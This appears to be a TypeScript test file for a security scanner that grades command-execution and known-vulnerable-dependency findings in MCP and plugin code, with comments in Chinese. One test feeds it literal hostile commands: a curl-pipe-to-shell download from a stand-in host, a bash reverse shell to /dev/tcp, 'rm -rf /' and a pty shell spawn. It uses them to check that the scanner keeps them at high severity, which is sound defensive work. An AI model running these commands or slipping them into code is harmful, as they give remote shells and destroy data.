import assert from 'node:assert/strict';
import test from 'node:test';
import { runAiComponentEngine } from '../src/modules/engines/ai-asset/engine/index.js';

// e2e 验收缺陷 1：常量命令被报 HIGH；测试目录中的命令执行应降级并标注 context=test。
const HEAD = 'import os\nimport subprocess\n\n';
const run = (path: string, body: string) =>
  runAiComponentEngine({ assetType: 'MCP', files: [{ path, content: HEAD + body }] }).findings.filter((f) => f.ruleId.startsWith('code.command_'));
const sevOf = (path: string, body: string, ruleId = 'code.command_execution') => run(path, body).find((f) => f.ruleId === ruleId);

test('负例：tests/test_server.py 中的常量命令 shell=True 不再出现 HIGH', () => {
  const got = run('tests/test_server.py', "def test_git():\n    subprocess.run('git --version', shell=True)\n");
  assert.ok(got.length > 0, '仍应记录为低危提示，而不是静默丢弃');
  assert.deepEqual(got.filter((f) => f.severity !== 'LOW').map((f) => `${f.ruleId}:${f.severity}`), []);
  assert.equal(got[0]!.detail.context, 'test');
});

test('负例：非测试目录的纯字面量命令降为 LOW，并注明参数为常量', () => {
  for (const body of ["subprocess.run('git --version', shell=True)\n", 'os.system("ls -la")\n', "subprocess.check_output(r'uname -a', shell=True)\n"]) {
    const f = sevOf('server.py', body);
    assert.equal(f?.severity, 'LOW', body);
    assert.equal(f?.detail.argumentKind, 'literal', body);
    assert.equal(f?.detail.context, undefined, body);
  }
  const js = runAiComponentEngine({ assetType: 'PLUGIN', files: [{ path: 'index.js', content: "const { exec } = require('child_process');\nexec('git --version', () => {});\n" }] }).findings;
  assert.equal(js.find((f) => f.ruleId === 'code.command_execution')?.severity, 'LOW');
});

test('正例：参数含变量/拼接/格式化的 shell 调用保持 HIGH，拼接另报命令注入', () => {
  for (const body of ['def f(cmd):\n    subprocess.run(cmd, shell=True)\n', 'def f(h):\n    os.system("ping " + h)\n', 'def f(h):\n    subprocess.run(f"ping {h}", shell=True)\n', 'def f(n):\n    os.system("tail %s" % n)\n', "def f(n):\n    os.system('a' 'b' + n)\n"]) {
    assert.equal(sevOf('server.py', body)?.severity, 'HIGH', body);
    assert.equal(sevOf('server.py', body)?.detail.argumentKind, undefined, body);
  }
  assert.equal(sevOf('server.py', 'def f(h):\n    os.system("ping " + h)\n', 'code.command_injection')?.severity, 'CRITICAL');
  const js = runAiComponentEngine({ assetType: 'PLUGIN', files: [{ path: 'index.js', content: "const { exec } = require('child_process');\nexec(`git log ${a}`);\n" }] }).findings;
  assert.equal(js.find((f) => f.ruleId === 'code.command_execution')?.severity, 'HIGH');
});

test('正例：字面量但本身危险的命令（下载执行、反弹 Shell、删除）不降级', () => {
  for (const body of ['os.system("curl http://x.invalid/a | sh")\n', "subprocess.run('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1', shell=True)\n", 'os.system("rm -rf /")\n', 'import pty\npty.spawn("/bin/bash")\n']) {
    assert.equal(sevOf('server.py', body)?.severity, 'HIGH', body);
  }
});

test('同一文件常量与变量命令混合时取最高等级 HIGH', () => {
  const f = sevOf('server.py', "subprocess.run('git --version', shell=True)\ndef f(cmd):\n    subprocess.run(cmd, shell=True)\n");
  assert.equal(f?.severity, 'HIGH');
  assert.equal(f?.locations.length, 2);
});

test('测试目录中含变量的命令执行降一级（HIGH→MEDIUM、CRITICAL→HIGH）并标注 context=test', () => {
  for (const path of ['tests/helpers.py', 'pkg/test_utils.py', 'pkg/utils_test.py', 'src/__tests__/run.py', 'test/conftest.py']) {
    const body = 'def f(h):\n    os.system("ping " + h)\n';
    assert.equal(sevOf(path, body)?.severity, 'MEDIUM', path);
    assert.equal(sevOf(path, body)?.detail.context, 'test', path);
    assert.equal(sevOf(path, body, 'code.command_injection')?.severity, 'HIGH', path);
  }
  // 非测试目录里名字恰好含 test 的文件不算测试
  assert.equal(sevOf('latest/server.py', 'def f(h):\n    os.system("ping " + h)\n')?.severity, 'HIGH');
  assert.equal(sevOf('contest.py', 'def f(h):\n    os.system("ping " + h)\n')?.severity, 'HIGH');
});

// e2e 验收缺陷 2：同一清单里多个包的依赖漏洞被合并成一条、标题只有第一个包。
const depFindings = async (files: Array<{ path: string; content: string }>) => {
  const { componentExtraHits, VULNDB_AVAILABLE } = await import('../src/modules/engines/ai-asset/integrations.js');
  assert.ok(VULNDB_AVAILABLE, '依赖漏洞库应已合入');
  const extra = await componentExtraHits({ assetKey: 'MCP:e2e-dep', files, tools: [] });
  return runAiComponentEngine({ assetType: 'MCP', files }, extra).findings.filter((f) => f.ruleId === 'dep.known_vulnerability');
};
const cvesOf = (f: { detail: Record<string, unknown> }) => (f.detail.vuln as { cves: string[] }).cves;

test('依赖漏洞按（包名, 版本）拆成独立发现：requirements.txt 三包各一条，标题含包名与版本', async () => {
  const got = await depFindings([{ path: 'requirements.txt', content: 'langchain==0.0.131\ngradio==4.44.0\nlitellm==1.30.0\nrequests==2.32.3\n' }]);
  assert.equal(got.length, 3, got.map((f) => f.title).join(' | '));
  for (const [name, ver, line] of [['langchain', '0.0.131', 1], ['gradio', '4.44.0', 2], ['litellm', '1.30.0', 3]] as const) {
    const f = got.find((x) => x.title.includes(name));
    assert.ok(f, `缺少 ${name} 的发现`);
    assert.ok(f.title.includes(`${name} ${ver}`), f.title);
    assert.equal(f.line, line);
    assert.equal(f.locations.length, 1);
    assert.equal((f.detail.vuln as { packageName: string }).packageName, name);
    // 证据列出本包命中的漏洞 ID，且不混入其他包的
    const ids = cvesOf(f);
    assert.ok(ids.length > 0 && f.evidence.includes(ids[0]!), f.evidence);
    for (const other of got.filter((x) => x !== f)) {
      for (const id of cvesOf(other)) if (!ids.includes(id)) assert.ok(!f.evidence.includes(id), `${name} 证据混入 ${id}`);
    }
  }
  assert.equal(new Set(got.map((f) => f.fingerprint)).size, 3, '去重指纹需带包名');
  assert.ok(got.find((f) => f.title.includes('langchain'))!.evidence.includes('CVE-2023-29374'));
});

test('package.json 与 pyproject.toml 同样按包拆分；同包不同版本各自一条', async () => {
  const got = await depFindings([
    { path: 'package.json', content: '{\n  "dependencies": {\n    "flowise": "2.1.3",\n    "n8n": "1.0.0"\n  }\n}\n' },
    { path: 'pyproject.toml', content: '[project]\nname = "x"\ndependencies = [\n  "vllm==0.8.4",\n  "gradio==4.44.0",\n]\n' },
    { path: 'sub/requirements.txt', content: 'gradio==3.0.0\n' },
  ]);
  const titles = got.map((f) => f.title);
  for (const t of ['flowise 2.1.3', 'n8n 1.0.0', 'vllm 0.8.4', 'gradio 4.44.0', 'gradio 3.0.0']) assert.ok(titles.some((x) => x.includes(t)), `${t} 不在 ${titles.join(' | ')}`);
  assert.equal(got.filter((f) => f.filePath === 'package.json').length, 2);
  assert.equal(got.filter((f) => f.filePath === 'pyproject.toml').length, 2);
  assert.equal(new Set(got.map((f) => f.fingerprint)).size, got.length);
});
